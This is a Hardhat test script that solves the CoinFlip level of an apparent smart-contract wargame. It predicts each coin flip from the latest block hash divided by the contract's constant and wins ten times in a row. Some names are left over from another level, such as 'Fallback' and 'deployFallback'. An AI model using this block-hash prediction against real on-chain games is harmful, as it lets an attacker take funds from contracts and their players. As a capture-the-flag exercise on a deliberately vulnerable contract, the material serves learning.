const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require( "chai" );
const { ethers } = require("hardhat");

describe("Fallback", function () {
    // Deploys the Fallback contract
    async function deployFallback() {
        const [owner, otherAccount] = await ethers.getSigners();
        const Level3 = await hre.ethers.getContractFactory("CoinFlip");
        const level3 = await Level3.deploy();
      
        await level3.deployed();
      
        console.log(
          `Level3 deployed at address ${level3.address}`
        );

        return {level3, owner, otherAccount};
    }

    /*
    This is a coin flipping game where you need to build up your winning streak by guessing the outcome
    of a coin flip. To complete this level you'll need to use your psychic abilities to guess the
    correct outcome 10 times in a row.
    */
    describe("Solve", function() {
        it("Should solve level3", async function() {
            const {level3, owner, otherAccount} = await loadFixture(deployFallback);
            let FACTOR = ethers.BigNumber.from("57896044618658097711785492504343953926634992332820282019728792003956564819968");

            for (let i = 0; i<10; i++) {
                const blockNum = await ethers.provider.getBlockNumber();
                const block = await ethers.provider.getBlock(blockNum);
                const flip = Math.floor(block.hash / FACTOR);
                const side = flip == 1 ? true : false;
                const result = await level3.connect(otherAccount).flip(side);
                // Calculate the correct flip and send a guess 10x
            }
            const wins = await level3.consecutiveWins();
            expect(wins).equals(10);
        })
    });
});